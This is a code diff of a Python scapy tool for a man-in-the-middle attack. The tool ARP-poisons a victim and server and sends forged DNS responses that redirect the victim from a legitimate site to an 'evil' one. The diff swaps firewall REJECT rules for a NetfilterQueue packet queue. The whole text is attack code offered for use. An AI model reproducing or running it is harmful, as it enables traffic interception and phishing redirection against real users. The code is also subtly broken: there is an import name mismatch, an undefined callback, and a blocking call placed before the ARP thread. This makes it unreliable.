@@ -1,8 +1,9 @@
 from scapy.all import *
 import threading
 import ArpPoison
-from pyptables import default_tables, restore
-from pyptables.rules import Rule
+from netfilterqueue import NetFilterQueue
+import os
+
 # TODO Fix For IPv6
 # Integrate as MIM attack
 # Fix crashing problem when DNSQR not detected
@@ -49,20 +50,21 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     print(EvilDNSResponse[IP].id)
     send(EvilDNSResponse)
     
-# def testSniffnExtract() :
-#     pkt = sniff(filter='host 8.8.8.8', session = IPSession, count=1, prn=lambda x: x.show())
-#     pkt[0].show()
+def startARPthread(ipVictim, ipServer) :
+    arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
+    arpThread.start()
+    
+def initQueue(queueNum) :
+    queue = NetfilterQueue()
+    queue.bind(queueNum, callback)
+    queue.run()
     
     
 def main() :
     pktCounter = 0
-    stop_dns = Rule(proto='udp', sport='53')
-    tables = default_tables()
-    tables['filter']['FORWARD'].append(stop_dns(jump='REJECT'))
-    stop_first = Rule(proto='udp', dport='53')
-    tables['filter']['FORWARD'].append(stop_first(jump='REJECT'))
-    arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
-    arpThread.start()
+    queueNum = 1
+    initQueue(queueNum)
+    startARPthread(ipVictim, ipServer)
     while True: 
         try:
             pkt = sniffPKT(ipVictim, goodSite)
